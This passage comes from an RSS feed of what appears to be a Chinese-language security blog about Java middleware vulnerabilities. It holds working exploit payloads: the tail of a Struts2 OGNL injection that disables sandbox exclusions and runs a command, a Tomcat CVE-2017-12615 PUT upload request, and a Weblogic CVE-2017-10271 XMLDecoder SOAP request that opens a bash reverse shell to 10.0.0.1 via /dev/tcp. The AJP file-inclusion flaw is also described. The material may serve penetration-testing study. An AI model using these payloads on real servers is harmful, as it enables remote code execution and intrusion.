%{(#instancemanager=#application[&amp;#34;org.apache.tomcat.InstanceManager&amp;#34;]).(#stack=#attr[&amp;#34;com.opensymphony.xwork2.util.ValueStack.ValueStack&amp;#34;]).(#bean=#instancemanager.newInstance(&amp;#34;org.apache.commons.collections.BeanMap&amp;#34;)).(#bean.setBean(#stack)).(#context=#bean.get(&amp;#34;context&amp;#34;)).(#bean.setBean(#context)).(#macc=#bean.get(&amp;#34;memberAccess&amp;#34;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&amp;#34;java.util.HashSet&amp;#34;)).(#bean.put(&amp;#34;excludedClasses&amp;#34;,#emptyset)).(#bean.put(&amp;#34;excludedPackageNames&amp;#34;,#emptyset)).(#arglist=#instancemanager.newInstance(&amp;#34;java.util.ArrayList&amp;#34;)).(#arglist.add(&amp;#34;id&amp;#34;)).(#execute=#instancemanager.newInstance(&amp;#34;freemarker.template.utility.Execute&amp;#34;)).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Tomcat</title>
      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/tomcat/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/tomcat/</guid>
      <description>&lt;h1 id=&#34;一tomcat&#34;&gt;一、Tomcat&lt;/h1&gt;
&lt;p&gt;Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。&lt;/p&gt;
&lt;h1 id=&#34;二漏洞介绍与利用&#34;&gt;二、漏洞介绍与利用&lt;/h1&gt;
&lt;h2 id=&#34;1put文件上传-cve-2017-12615&#34;&gt;1、PUT文件上传 CVE-2017-12615&lt;/h2&gt;
&lt;p&gt;主要影响版本：&lt;/p&gt;
&lt;p&gt;Tomcat 7.0.0-7.0.81&lt;/p&gt;
&lt;p&gt;POC：此漏洞较为简单，可梭哈&lt;/p&gt;
&lt;p&gt;Tomcat 7.0.0-7.0.81&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POC：
PUT /1.txt/ HTTP/1.1
Host: 192.168.2.66:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://192.168.2.66:8080/tomcat.css
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 3

cxk
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2ajp文件包含&#34;&gt;2、AJP文件包含&lt;/h2&gt;
&lt;p&gt;由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Weblogic</title>
      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/weblogic/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/weblogic/</guid>
      <description>&lt;h1 id=&#34;一weblogic&#34;&gt;一、Weblogic&lt;/h1&gt;
&lt;p&gt;Weblogic 是美国 Oracle 公司出品的应用服务器软件，确切的说这是基于 Java EE 架构的中间件，主要用于开发、继承、部署和管理大型分布式 web 应用、网络应用和数据库应用。Weblogic 将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的 Java 应用服务器软件之一，也是世界上第一个成功商业化的 Java EE 应用服务器，当然 Weblogic 具有可扩展性、快速开发、灵活可靠等优势，其默认端口为7001，目前比较活跃的版本为10和12，最新版本为14。&lt;/p&gt;
&lt;p&gt;在功能性上，Weblogic 是 Java EE 的全能应用服务器，包括 EJB、JSP、servlet、JMS 等，是商业软件中排名第一的容器（JSP、servlet、EJB等），并提供其他工具（例如Java编辑器），因此也是一个综合的开发以及运行环境。在扩展性上，Weblogic Server 凭借出色的群集技术，拥有处理关键 web 应用系统问题所需的性能、扩展性和高可用性。Weblogic Server 既实现了网页集群，也实现了EJB组件群集，而且不需要任何专门的硬件或操作系统支持。网页群集可以实现透明的复制、负载平衡以及表示内容容错。无论是网页群集还是组建群集，对于电子商务解决方案所要求的可扩展性和可用性都是至关重要的。&lt;/p&gt;
&lt;h1 id=&#34;二漏洞介绍与利用&#34;&gt;二、漏洞介绍与利用&lt;/h1&gt;
&lt;h2 id=&#34;1wls-wsat-xmldecoder-反序列化漏洞cve-2017-10271&#34;&gt;1、wls-wsat XMLDecoder 反序列化漏洞（CVE-2017-10271）&lt;/h2&gt;
&lt;p&gt;Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。&lt;/p&gt;
&lt;p&gt;影响版本&lt;/p&gt;
&lt;p&gt;10.3.6.0.0&lt;/p&gt;
&lt;p&gt;12.1.3.0.0&lt;/p&gt;
&lt;p&gt;12.2.1.1.0&lt;/p&gt;
&lt;p&gt;12.2.1.2.0&lt;/p&gt;
&lt;p&gt;检测方式：&lt;/p&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;p&gt;反弹shell记得编码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

&amp;lt;soapenv:Envelope xmlns:soapenv=&amp;#34;http://schemas.xmlsoap.org/soap/envelope/&amp;#34;&amp;gt; &amp;lt;soapenv:Header&amp;gt;
&amp;lt;work:WorkContext xmlns:work=&amp;#34;http://bea.com/2004/06/soap/workarea/&amp;#34;&amp;gt;
&amp;lt;java version=&amp;#34;1.4.0&amp;#34; class=&amp;#34;java.beans.XMLDecoder&amp;#34;&amp;gt;
&amp;lt;void class=&amp;#34;java.lang.ProcessBuilder&amp;#34;&amp;gt;
&amp;lt;array class=&amp;#34;java.lang.String&amp;#34; length=&amp;#34;3&amp;#34;&amp;gt;
&amp;lt;void index=&amp;#34;0&amp;#34;&amp;gt;
&amp;lt;string&amp;gt;/bin/bash&amp;lt;/string&amp;gt;
&amp;lt;/void&amp;gt;
&amp;lt;void index=&amp;#34;1&amp;#34;&amp;gt;
&amp;lt;string&amp;gt;-c&amp;lt;/string&amp;gt;
&amp;lt;/void&amp;gt;
&amp;lt;void index=&amp;#34;2&amp;#34;&amp;gt;
&amp;lt;string&amp;gt;bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/10.0.0.1/21 0&amp;amp;gt;&amp;amp;amp;1&amp;lt;/string&amp;gt;
&amp;lt;/void&amp;gt;
&amp;lt;/array&amp;gt;
&amp;lt;void method=&amp;#34;start&amp;#34;/&amp;gt;&amp;lt;/void&amp;gt;
&amp;lt;/java&amp;gt;
&amp;lt;/work:WorkContext&amp;gt;
&amp;lt;/soapenv:Header&amp;gt;
&amp;lt;soapenv:Body/&amp;gt;
&amp;lt;/soapenv:Envelope&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/zj_img/WEBRESOURCE82c2c4952a93c896bb4a2d5db2359a53%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
